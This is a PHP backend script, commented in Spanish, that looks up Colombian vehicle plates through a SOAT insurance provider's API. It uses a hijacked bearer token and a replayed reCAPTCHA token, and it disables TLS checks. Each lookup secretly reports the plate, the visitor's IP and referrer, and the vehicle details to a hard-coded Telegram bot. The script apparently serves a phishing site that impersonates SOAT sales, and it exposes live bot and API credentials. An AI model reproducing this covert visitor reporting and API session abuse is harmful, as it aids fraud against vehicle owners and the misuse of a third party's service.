<?php
header('Content-Type: application/json');

// Verificar si se proporcionó una placa
if (!isset($_GET['placa'])) {
    echo json_encode(['error' => 'Debe proporcionar una placa']);
    exit;
}

$placa = strtoupper($_GET['placa']);

// Función para enviar mensaje a Telegram
function enviarMensajeTelegram($datos, $error = false) {
    $BOT_TOKEN = '7973242717:AAH3wAogcu8nj6rlXTOceG7NVUKJAj7XsAA';
    $CHAT_ID = '-4658373730';
    
    if ($error) {
        $mensaje = "❌ *Error en la consulta* ❌\n";
        $mensaje .= "🚗 Placa: {$datos['placa']}\n";
        $mensaje .= "❌ Error: {$datos['error']}\n";
    } else {
        $mensaje = "🔵 *Consulta realizada* 🔵\n";
        $mensaje .= "📝 Placa: {$datos['placa']}\n";
        $mensaje .= "🌐 IP: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']) . "\n";
        $mensaje .= "🔗 Dominio: " . ($_SERVER['HTTP_REFERER'] ?? 'Consulta directa') . "\n";
        $mensaje .= "💰 Total a pagar: {$datos['precio']}\n";
        $mensaje .= "🚙 Marca: {$datos['marca']}\n";
        $mensaje .= "📋 Línea: {$datos['linea']}\n";
        $mensaje .= "📅 Modelo: {$datos['modelo']}\n";
        $mensaje .= "⚙️ Cilindraje: {$datos['cc']}cc\n";
        $mensaje .= "🚗 País: Colombia 🚗";
    }

    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data)
    ]);
    
    curl_exec($ch);
    curl_close($ch);
}

// Función para formatear el precio
function formatearPrecio($precio) {
    return '$' . number_format($precio, 0, ',', '.');
}

try {
    $ch = curl_init('https://www.esbus.transfiriendo.com/SoatNetSEApi/api/v2/Vehicle/GetVehicle');
    
    $requestData = [
        'NumberPlate' => $placa,
        'CountryCode' => 57,
        'RuntVehicleConfiguration' => 1
    ];

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($requestData),
        // Opciones SSL y conexión
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_ENCODING => '',
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_HTTPHEADER => [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: es-419,es;q=0.9',
            'Authorization: bearer 419C45C901AA10F36CCCF7521F5FD13997302C92-10474312',
            'Connection: keep-alive',
            'Content-Type: application/json',
            'Origin: https://www.esbus.transfiriendo.com',
            'Referer: https://www.esbus.transfiriendo.com/SoatNetSEPVV/?ContactHash=419C45C901AA10F36CCCF7521F5FD13997302C92-10474312',
            'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "macOS"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin',
            'recaptcha: eyJ0aW1lc3RhbXAiOjE3MzkzOTY3ODgsImFsZyI6IkhTMjU2IiwiZXhwIjoxNzM5Mzk2ODQ4LCJ0eXAiOiJKV1QifQ.eyJoYXNoIjoiNDE5QzQ1QzkwMUFBMTBGMzZDQ0NGNzUyMUY1RkQxMzk5NzMwMkM5Mi0xMDQ3NDMxMiIsInRpbWVzdGFtcCI6MTczOTM5Njc4OCwiYWN0aW9uIjoiZ2V0X3ZlaGljbGUiLCJleHAiOjE3MzkzOTc2ODh9.WLyfxEdwnTKG-hEVg_wbU7iUI9v3Hu6xp4fKH0x0RH4'
        ]
    ]);

    $response = curl_exec($ch);
    
    if ($response === false) {
        $error = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        throw new Exception("Error en la petición - Detalles: $error\nInfo: " . print_r($info, true));
    }
    
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) {
        throw new Exception('Error HTTP: ' . $httpCode);
    }

    $data = json_decode($response, true);

    if (empty($data['Success']) || empty($data['Data'])) {
        throw new Exception('Respuesta inválida de la API');
    }

    $vehiculo = $data['Data'];
    $resultadoFinal = [
        'placa' => $vehiculo['NumberPlate'],
        'modelo' => $vehiculo['VehicleYear'],
        'marca' => $vehiculo['BrandName'],
        'linea' => $vehiculo['VehicleLineDescription'],
        'cc' => (string)$vehiculo['CylinderCapacity'],
        'precio' => formatearPrecio($vehiculo['NewTariff']['InsurancePremium'])
    ];

    // Enviar notificación a Telegram con los datos encontrados
    enviarMensajeTelegram($resultadoFinal);

    // Mostrar el resultado
    echo json_encode($resultadoFinal, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);

} catch (Exception $e) {
    $error = ['placa' => $placa, 'error' => $e->getMessage()];
    enviarMensajeTelegram($error, true);
    echo json_encode(['error' => 'Error al consultar: ' . $e->getMessage()]);
}
?>